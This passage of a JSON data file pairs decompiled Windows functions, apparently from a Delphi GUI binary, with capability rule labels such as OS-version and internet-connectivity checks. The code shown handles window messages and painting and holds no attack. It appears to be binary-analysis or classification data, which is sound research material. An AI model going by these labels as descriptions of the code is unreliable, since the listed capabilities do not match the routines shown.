        "decompiled_code": "\nvoid fcn.00472874(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x260) == '\\0') {\n        puStack12 = 0x472893;\n        var_4h = in_EAX;\n        cVar1 = fcn.00466fb4();\n        if (cVar1 != '\\0') {\n            uStack16 = 0x47295f;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            *(var_4h + 0x260) = 1;\n            puStack12 = &stack0xfffffffc;\n            cVar1 = fcn.00471e04();\n            if (cVar1 == '\\0') {\n                cVar1 = fcn.00471e04();\n                if (cVar1 == '\\0') {\n                    fcn.0047247c();\n                    fcn.0047247c();\n                }\n                else {\n                    fcn.0047247c();\n                    fcn.0047247c();\n                }\n            }\n            else {\n                fcn.0047247c();\n                fcn.0047247c();\n            }\n            *in_FS_OFFSET = uStack20;\n            *(var_4h + 0x260) = 0;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "00472fb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00472fb0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00402ed8();\n    *(in_EAX + 0x2a4) = uVar1;\n    fcn.00472598();\n    *(in_EAX + 0x50) = *0x473174;\n    fcn.00479188();\n    fcn.004791c4();\n    fcn.0045e63c();\n    fcn.0045e670();\n    piVar2 = fcn.0042e6cc();\n    *(in_EAX + 0x288) = piVar2;\n    (***0x4a4d4c)(0x31);\n    (**(*piVar2 + 0x40))();\n    (***0x4a4d4c)();\n    (**(**(in_EAX + 0x288) + 0x34))();\n    iVar3 = *(in_EAX + 0x288);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = fcn.00473c60;\n    *(in_EAX + 0x278) = 2;\n    uVar1 = fcn.00428554();\n    *(in_EAX + 0x280) = uVar1;\n    fcn.0045d7f0();\n    *(in_EAX + 0x270) = *0x473178;\n    *(in_EAX + 0x271) = 2;\n    *(in_EAX + 0x273) = 0;\n    *(in_EAX + 0x279) = 3;\n    *(in_EAX + 0x28c) = 0;\n    **(in_EAX + 0x2a4) = *(*0x4ab07c + 0x40);\n    uVar1 = fcn.0047dc40();\n    *(*(in_EAX + 0x2a4) + 4) = uVar1;\n    iVar3 = fcn.0047da14();\n    *(iVar3 + 0x24) = in_EAX;\n    *(iVar3 + 0x20) = fcn.0047dac8;\n    *(*(in_EAX + 0x2a4) + 8) = 0;\n    *(in_EAX + 0x27d) = 1;\n    uVar1 = fcn.00404518();\n    *(in_EAX + 0xac) = uVar1;\n    *(in_EAX + 0x329) = 0xff;\n    *(in_EAX + 0x354) = 0;\n    fcn.00473fe4();\n    fcn.0045f10c();\n    fcn.0045f070();\n    fcn.00466e94();\n    fcn.00479a4c();\n    *(in_EAX + 0x34c) = 10;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = 0x32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 798
    },
    "004731e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004731e4(void)\n\n{\n    char cVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    int32_t *var_5h;\n    \n    puStack16 = 0x4731ef;\n    *NULL = fcn.00404a0c();\n    puStack16 = 0x473202;\n    var_5h._0_1_ = extraout_DL;\n    fcn.0047b018();\n    if ((*(stack0xfffffff8 + 7) & 8) == 0) {\n        puStack16 = 0x473217;\n        (**(***0x4a513c + 0x14))();\n    }\n    uStack20 = 0x4732e4;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(stack0xfffffff8 + 0x9f) != '\\0') {\n        puStack16 = &stack0xfffffffc;\n        (**(*stack0xfffffff8 + 0xe8))();\n    }\n    fcn.00476ba8();\n    cVar1 = fcn.00466fb4();\n    if (cVar1 != '\\0') {\n        (**(*stack0xfffffff8 + 0xb4))();\n    }\n    fcn.00479a84();\n    fcn.00404640();\n    fcn.00404640();\n    fcn.0040f840();\n    fcn.0040f840();\n    fcn.0047da14();\n    fcn.00404640();\n    fcn.00402f0c();\n    fcn.00472610();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4732eb;\n    uStack20 = 0x4732e3;\n    (**(***0x4a513c + 0x18))();\n    return;\n}\n",
        "token_count": 462
    },
    "00473300": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473300(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x31a) != 0) {\n        uStack28 = 0x473341;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        (**(in_EAX + 0x318))();\n        *in_FS_OFFSET = uStack32;\n    }\n    if ((*(in_EAX + 0x358) & 2) != 0) {\n        puStack24 = 0x473376;\n        fcn.00473fe4();\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "0047337c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047337c(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x322) != 0) {\n        uStack28 = 0x4733bd;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        (**(in_EAX + 800))();\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "004733dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004733dc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.00461668();\n    if ((*(in_EAX + 0x268) != 0) && ((*(in_EAX + 0x30) == 0 || ((*(in_EAX + 0x1c) & 0x10) == 0)))) {\n        *(in_EAX + 0x268) = 0;\n        cVar1 = fcn.0040483c();\n        if (cVar1 != '\\0') {\n            fcn.004766a8();\n        }\n    }\n    fcn.0047da14();\n    cVar1 = fcn.0047dd00();\n    if (cVar1 != '\\0') {\n        fcn.0047dac8();\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "0047357c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047357c(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x47358f;\n    fcn.004628b4();\n    uStack24 = 0x4737f9;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *(in_EAX + 0x2b0) = 0;\n    *(in_EAX + 0x2b4) = 0;\n    *(in_EAX + 0x2b8) = 0;\n    bVar1 = false;\n    puStack20 = &stack0xfffffffc;\n    iVar2 = fcn.004045cc();\n    if (iVar2 == *0x46fec0) {\n        *(in_EAX + 0x27c) = *0x4a87f5 ^ 1;\n    }\n    fcn.00461edc();\n    if ((**(in_EAX + 0x2a4) != 0) && (0 < *(in_EAX + 0x2b8))) {\n        if (((*(in_EAX + 0x8c) & 0x10) != 0) && (**(in_EAX + 0x2a4) != *(*0x4ab07c + 0x40))) {\n            uVar3 = fcn.00427de8(*(*0x4ab07c + 0x40), **(in_EAX + 0x2a4));\n            sub.kernel32.dll_MulDiv(uVar3);\n            fcn.00427df0();\n        }\n        **(in_EAX + 0x2a4) = *(*0x4ab07c + 0x40);\n        iVar2 = fcn.00473bb0();\n        if (iVar2 != *(in_EAX + 0x2b8)) {\n            bVar1 = true;\n            fcn.00472ad8();\n            fcn.0045ea00();\n            fcn.00466760();\n            if ((*(in_EAX + 0x8c) & 4) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x2b0), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x2b0) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 8) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x2b4) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 0x20) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x242), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x242) = uVar3;\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x246) = uVar3;\n            }\n        }\n    }\n    if (0 < *(in_EAX + 0x2b0)) {\n        fcn.0045e8d8();\n    }\n    if (0 < *(in_EAX + 0x2b4)) {\n        fcn.0045e91c();\n    }\n    *(in_EAX + 0x8c) = *0x473808;\n    if (!bVar1) {\n        fcn.00472ad8();\n        fcn.00466760();\n    }\n    uVar3 = 0;\n    fcn.004601fc(0);\n    *in_FS_OFFSET = uVar3;\n    fcn.004628bc(0x473800);\n    return;\n}\n",
        "token_count": 906
    },
    "0047380c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0047380c(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    // switch table (6 cases) at 0x473822\n    switch(in_EAX & 0x7f) {\n    case 0:\n        uVar1 = fcn.0047da14();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0xc) != 0;\n    case 1:\n        uVar1 = fcn.0047da14();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x10) != 0;\n    case 2:\n        uVar1 = fcn.0047da14();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x14) != 0;\n    case 3:\n        uVar1 = fcn.0047da14();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x18) != 0;\n    case 4:\n        iVar2 = fcn.0047da14();\n        return *(iVar2 + 8);\n    case 5:\n        iVar2 = fcn.0047da14();\n        return *(iVar2 + 0x28);\n    default:\n        return 0;\n    }\n}\n",
        "token_count": 308
    },
    "00473b74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00473b74(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18) >> 0x10;\n    }\n    return *(in_EAX + 0x40);\n}\n",
        "token_count": 96
    },
    "00473b94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00473b94(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18);\n    }\n    return *(in_EAX + 0x44);\n}\n",
        "token_count": 90
    },
    "00473c60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473c60(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x4a4dfc == '\\0') {\n        fcn.00466ca8();\n        iVar3 = fcn.00471334();\n        if (iVar3 != 0) {\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    else {\n        cVar1 = fcn.00466fb4();\n        if ((cVar1 != '\\0') && (*(in_EAX + 0x271) != '\\x03')) {\n            uVar2 = fcn.00476d1c();\n            uVar2 = fcn.00466ca8(0x80, 1, uVar2);\n            sub.user32.dll_SendMessageA(uVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "00473ccc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00473ccc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 600) == '\\0') && (*(*(in_EAX + 0x250) + 0x10) == 0)) && (*(*(in_EAX + 0x254) + 0x10) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 93
    },
    "00474028": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00474028(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x47410e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x277) == '\\x01') && (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x57) != '\\0')) &&\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x30) == 0)) {\n        fcn.00407480();\n        fcn.0040d9f8();\n        fcn.00404eb4();\n        puVar1 = puStack16;\n    }\n    puStack16 = puVar1;\n    if ((in_EAX == *(*0x4ab078 + 0x44)) && ((*(in_EAX + 0x1c) & 8) == 0)) {\n        if (*(in_EAX + 0x57) == '\\0') {\n            fcn.0047ddf4();\n            fcn.004713b0();\n            uVar3 = fcn.0047ddf4();\n            fcn.00466ca8(uVar3);\n            fcn.004713b0();\n        }\n        else {\n            uVar2 = fcn.0047ddf4();\n            fcn.00466ca8(uVar2 ^ 1);\n            fcn.004713b0();\n            fcn.004713b0();\n        }\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x474115;\n    uStack20 = 0x47410d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 464
    },
    "00474120": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00474120(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if ((param_2 != in_EAX[0xc]) && (param_2 != in_EAX)) {\n        bVar1 = in_EAX[0xc] == NULL;\n        if (bVar1) {\n            puStack20 = 0x474159;\n            fcn.00468048();\n        }\n        uStack24 = 0x4741d0;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (bVar1) {\n            puStack20 = &stack0xfffffffc;\n            (**(*in_EAX + 0xb0))();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            in_EAX[0x9a] = 0;\n        }\n        in_EAX[0x9b] = 0;\n        fcn.00468110();\n        if (in_EAX[0xc] == 0) {\n            fcn.00463868();\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x4741d7;\n        if (bVar1) {\n            uStack24 = 0x4741cf;\n            fcn.00468048();\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 370
    },
    "004741dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004741dc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0041faf8(arg_8h);\n    if (*(in_EAX + 0x298) != 0) {\n        (**(**(in_EAX + 0x298) + 0x30))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0047421c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047421c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar6 = *param_2;\n    if (iVar6 < 0x113) {\n        if (iVar6 == 0x112) {\n            if ((((param_2[1] & 0xfff0U) == 0xf120) && (*(*0x4ab078 + 0x44) == in_EAX)) &&\n               (cVar1 = fcn.0047ddf4(),  cVar1 != '\\0')) {\n                fcn.0047ddfc();\n            }\n            goto code_r0x00474748;\n        }\n        if (iVar6 - 6U < 3) {\n            if (*0x4a48f0 == '\\0') {\n                return;\n            }\n            if ((*param_2 == 7) && ((*(in_EAX + 7) & 0x10) == 0)) {\n                iVar6 = 0;\n                if (*(in_EAX + 0x277) == '\\x02') {\n                    iVar2 = fcn.004750cc();\n                    if (iVar2 != 0) {\n                        fcn.004750cc();\n                        iVar6 = fcn.00466ca8();\n                    }\n                }\n                else if ((in_EAX[0x9a] != NULL) && (in_EAX[0x9a] != in_EAX)) {\n                    iVar6 = fcn.00466ca8();\n                }\n                if (iVar6 != 0) {\n                    sub.user32.dll_SetFocus();\n                    return;\n                }\n            }\n            goto code_r0x00474748;\n        }\n        if (iVar6 == 0x2b) {\n            piVar3 = param_2[2];\n            if (((*piVar3 == 1) && (in_EAX[0xa4] != 0)) && (iVar6 = fcn.0045784c(),  iVar6 != 0)) {\n                fcn.00428554();\n                *in_FS_OFFSET = &stack0xffffffd0;\n                sub.gdi32.dll_SaveDC();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                fcn.00428be8();\n                fcn.00428a7c();\n                piVar3 = *(piVar3 + 4);\n                puStack72 = 0x474554;\n                fcn.00458fd4(piVar3);\n                *in_FS_OFFSET = piVar3;\n                fcn.00428be8();\n                puStack72 = 0x47457b;\n                sub.gdi32.dll_RestoreDC();\n                return;\n            }\n            goto code_r0x00474748;\n        }\n        if (iVar6 == 0x2c) {\n            piVar3 = param_2[2];\n            if (((*piVar3 == 1) && (in_EAX[0xa4] != 0)) && (piVar4 = fcn.0045784c(),  piVar4 != NULL)) {\n                fcn.00466ca8();\n                uVar5 = sub.user32.dll_GetWindowDC();\n                *in_FS_OFFSET = &stack0xffffffcc;\n                fcn.00428554();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                puStack72 = 0x47461e;\n                iVar6 = sub.gdi32.dll_SaveDC();\n                uStack76 = 0x474683;\n                piStack80 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb0;\n                puStack72 = &stack0xfffffffc;\n                fcn.00428be8();\n                fcn.00428a7c();\n                piVar3 = piVar3 + 4;\n                (**(*piVar4 + 0x38))();\n                *in_FS_OFFSET = piVar3;\n                uStack76 = 0x47468a;\n                piStack80 = 0x474675;\n                fcn.00428be8();\n                piStack80 = iVar6;\n                sub.gdi32.dll_RestoreDC(uVar5);\n                return;\n            }\n            goto code_r0x00474748;\n        }\n        if (iVar6 == 0x46) {\n            if (*0x474760 == (*(in_EAX + 7) & *0x47475c)) {\n                if ((*(in_EAX + 0x9e) - 1U < 2) && (*(in_EAX + 0x273) != '\\x02')) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 2;\n                }\n                if (((*(in_EAX + 0x9e) == '\\x01') || (*(in_EAX + 0x9e) == '\\x03')) &&\n                   ((*(in_EAX + 0x271) == '\\x02' || (*(in_EAX + 0x271) == '\\x05')))) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 1;\n                }\n            }\n            goto code_r0x00474748;\n        }\n    }\n    else {\n        if (iVar6 - 0x31eU < 2) {\n            fcn.0047dac8();\n            goto code_r0x00474748;\n        }\n        if (iVar6 == 0xb01a) {\n            if (in_EAX[0x25] != 0) {\n                fcn.0040483c();\n            }\n            goto code_r0x00474748;\n        }\n        if (iVar6 == 0xb01b) {\n            if (in_EAX[0x25] != 0) {\n                fcn.0040483c();\n            }\n            goto code_r0x00474748;\n        }\n        if (iVar6 == 0xb047) {\n            iVar6 = param_2[1];\n            iVar2 = 0;\n            while ((iVar6 != 0 && (iVar2 == 0))) {\n                iVar2 = fcn.0045b9a4();\n                iVar6 = sub.user32.dll_GetParent();\n            }\n            if ((iVar2 != 0) &&\n               ((((piVar3 = fcn.00471968(),  iVar2 != in_EAX[0x9a] || (iVar2 != *(*0x4ab07c + 100))) && (piVar3 != NULL)\n                 ) && ((piVar3 == in_EAX || (piVar3 != *(*0x4ab07c + 0x68))))))) {\n                if ((piVar3[0x9a] != 0) && (iVar2 != piVar3[0x9a])) {\n                    fcn.004601fc(0);\n                }\n                (**(*piVar3 + 0xf8))();\n            }\n            goto code_r0x00474748;\n        }\n    }\n    if (iVar6 == *0x4ab084) {\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n        fcn.004601fc(0);\n    }\ncode_r0x00474748:\n    fcn.00463da4();\n    return;\n}\n",
        "token_count": 1741
    },
    "004747f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004747f0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff6c;\n    int32_t iStack140;\n    uint *puStack136;\n    uchar *puStack132;\n    uint *puStack128;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_58h;\n    uint var_4ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar2 = *param_2;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar2 != 0xf) {\n        if (iVar2 == 0x14) {\n            fcn.00428438();\n            puStack128 = 0x47485e;\n            (**(*var_4h + 0x44))();\n            puStack128 = &fcn.004747f0::var_6ch;\n            puStack132 = var_8h[1];\n            puStack136 = 0x47486e;\n            sub.user32.dll_FillRect();\n            if ((*(var_4h + 0x277) == '\\x02') && (var_4h[0xa7] != 0)) {\n                puStack136 = &fcn.004747f0::var_5ch;\n                iStack140 = var_4h[0xa7];\n                sub.user32.dll_GetClientRect();\n                uVar1 = fcn.00428438();\n                sub.user32.dll_FillRect(var_8h[1], &fcn.004747f0::var_5ch, uVar1);\n            }\n            var_8h[3] = 1;\n        }\n        else if (iVar2 == 0x3f) {\n            puStack128 = 0x4748cd;\n            fcn.00474764(&stack0xfffffffc);\n            if (*(var_4h + 0x277) == '\\x02') {\n                iVar2 = fcn.00475100();\n                if (iVar2 != 0) {\n                    puStack128 = 0x4748f0;\n                    fcn.004747b0(&stack0xfffffffc);\n                }\n                fcn.00471364();\n            }\n        }\n        else if (iVar2 == 0x84) {\n            puStack128 = 0x474827;\n            fcn.00474764(&stack0xfffffffc);\n            if (var_8h[3] == 1) {\n                var_8h[3] = -1;\n            }\n        }\n        else {\n            puStack128 = 0x4749cb;\n            fcn.00474764(&stack0xfffffffc);\n        }\n        return;\n    }\n    var_ch = param_2[1];\n    if (var_ch == 0) {\n        puStack128 = in_EAX[0xa7];\n        puStack132 = 0x474930;\n        iVar2 = sub.user32.dll_BeginPaint();\n        var_8h[1] = iVar2;\n    }\n    puStack136 = 0x4749be;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &stack0xfffffffc;\n    if (var_ch == 0) {\n        in_stack_ffffff6c = var_4h[0xa7];\n        puStack132 = &stack0xfffffffc;\n        sub.user32.dll_GetWindowRect(in_stack_ffffff6c, &fcn.004747f0::var_5ch);\n        fcn.0045ea84();\n        fcn.0045d550();\n    }\n    fcn.00464400();\n    *in_FS_OFFSET = in_stack_ffffff6c;\n    iStack140 = 0x4749cc;\n    if (var_ch == 0) {\n        sub.user32.dll_EndPaint(var_4h[0xa7], &fcn.004747f0::var_4ch);\n    }\n    return;\n}\n",
        "token_count": 939
    },
    "00474ad4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00474ad4(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0xa3) == '\\0') {\n        *(in_EAX + 0xa3) = 1;\n        uStack20 = 0x474b54;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack24;\n        if (*(in_EAX + 0x18) != '\\0') {\n            if (in_EAX[0xc] == 0) {\n                puStack16 = &stack0xfffffffc;\n                (**(*in_EAX + 0x74))();\n            }\n            else {\n                (**(*in_EAX + 0x74))();\n            }\n            (**(*in_EAX + 0x70))();\n        }\n        *in_FS_OFFSET = uStack24;\n        *(in_EAX + 0xa3) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "00474d7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
